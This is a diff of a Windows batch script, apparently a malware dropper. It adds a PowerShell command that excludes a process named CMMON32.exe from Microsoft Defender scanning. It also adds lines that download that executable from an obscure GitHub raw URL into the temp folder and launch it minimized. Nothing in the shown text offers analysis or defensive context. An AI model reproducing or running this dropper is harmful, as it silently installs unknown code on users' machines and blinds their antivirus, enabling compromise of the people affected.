@@ -22,11 +22,11 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 
-powershell  Set-MpPreference -ExclusionProcess "CMMON.EXE"
+powershell  Set-MpPreference -ExclusionProcess "CMMON32.exe"
 cd %TEMP%
 
 
-powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON.EXE' -OutFile CMMON.EXE" 
-Start-Process 'CMMON.EXE' -WindowStyle Minimized
+powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON32.exe' -OutFile CMMON32.exe" 
+Start-Process 'CMMON32.exe' -WindowStyle Minimized
 
 
